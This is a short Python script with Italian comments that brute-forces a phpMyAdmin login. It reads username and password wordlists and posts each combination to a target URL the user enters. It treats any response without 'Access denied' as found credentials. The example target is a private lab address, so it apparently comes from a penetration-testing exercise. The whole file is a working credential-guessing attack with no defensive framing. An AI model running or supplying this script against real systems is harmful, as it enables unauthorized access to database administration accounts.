# Importo libreria requests
import requests

username_file = "usernames.lst"
password_file = "passwords.lst"

url = input ("Inserisci IP/url del sistema target:") #http://192.168.50.101/phpMyAdmin/

# Apro i file dizionari
username_file = open(username_file)
password_file = open(password_file)

usernames = username_file.readlines() #Creo liste con nomi
passwords = password_file.readlines() #Creo liste con password
	
username_file.close() #chiudo il file
password_file.close() 

# Itero tutti gli username
for user in usernames:
	user = user.rstrip()
	
	# Per ogni user itero tutte le password
	for pwd in passwords:
		pwd = pwd.rstrip()
		
		# Preparo il payload
		data = {'pma_username': user, 'pma_password': pwd, 'input_go': 'Go'}
		response = requests.post(url, data=data)
		# Se il server trova la risorsa...
		if response.status_code == 200: 
			# ...e non vi è messaggio di errore allora le credenziali sono corrette
			if not 'Access denied' in response.text:
				print (f"##################################\n\nPassword trovata {user} - {pwd}")
				exit()
					
			else:
				print(f"Password {user} - {pwd} non valida")
		else:
			# Pagina non trovata
			print("errore 404")
